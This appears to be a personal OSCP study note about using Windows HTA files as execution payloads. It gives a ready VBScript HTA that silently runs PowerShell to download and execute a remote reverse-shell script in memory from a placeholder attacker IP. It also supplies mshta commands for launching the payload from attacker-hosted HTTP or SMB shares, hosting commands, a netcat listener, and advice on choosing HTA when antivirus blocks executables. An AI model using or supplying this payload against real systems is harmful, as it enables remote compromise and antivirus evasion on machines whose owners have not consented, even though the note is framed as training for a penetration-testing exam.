# HTA Files — Windows Execution Payloads (OSCP)

## What an HTA File Is

HTA = **HTML Application**

An HTA file is a Windows-specific file executed by `mshta.exe`.
It contains HTML + VBScript or JScript and runs with the privileges of the user who opens it.

Key point:
> HTA files are **not web exploits**. They are **Windows execution payloads** — you use them after you already have some access or can trigger execution.

---

## When to Use HTA Files

Use HTA when:
- You have RDP access and can open File Explorer or a Run dialog
- You can trigger execution via a UNC path (`\\KALI_IP\share\payload.hta`)
- File upload is allowed but `.exe` is blocked by AV
- You want in-memory execution (nothing written to disk)
- You have a command injection and can call `mshta.exe`

---

## How HTA Files Are Executed

Double-click (RDP / GUI):
```cmd
payload.hta
```

Command line:
```cmd
mshta.exe payload.hta
```

Via UNC path (directly from your SMB share — no download):
```cmd
mshta.exe \\<KALI_IP>\share\payload.hta
```

Run dialog (Win+R):
```
\\<KALI_IP>\share\payload.hta
```

---

## Create a Reverse Shell HTA

```bash
nano payload.hta
```

Paste:
```html
<html>
<head>
<script language="VBScript">
    Set shell = CreateObject("Wscript.Shell")
    shell.Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/rev.ps1')"
    window.close()
</script>
</head>
</html>
```

Replace `<KALI_IP>` with your VPN IP (tun0).

What this does:
1. VBScript calls PowerShell silently
2. PowerShell downloads `rev.ps1` from your machine into memory
3. Executes it — no file written to disk

---

## Host the HTA File

**Option 1 — HTTP:**
```bash
python3 -m http.server 80
```

Victim runs:
```cmd
mshta.exe http://<KALI_IP>/payload.hta
```

**Option 2 — SMB (execute without downloading):**
```bash
impacket-smbserver share . -smb2support
```

Victim runs:
```cmd
mshta.exe \\<KALI_IP>\share\payload.hta
```

---

## Set Up Your Listener First

Before triggering the HTA, start your listener:
```bash
nc -lvnp 443
```

---

## HTA vs EXE — When to Choose HTA

| Situation | Use |
|-----------|-----|
| `.exe` blocked by AV | HTA |
| No AV concerns | EXE (simpler) |
| Want in-memory execution | HTA |
| RDP access available | Either |
| Only command injection | HTA via mshta.exe |

---

## Related Notes

- [[htaccess_Bypass]]
- [[File_Transfer]]
- [[UNC_Execution]]
- [[Msfvenom]]
- [[Netcat]]
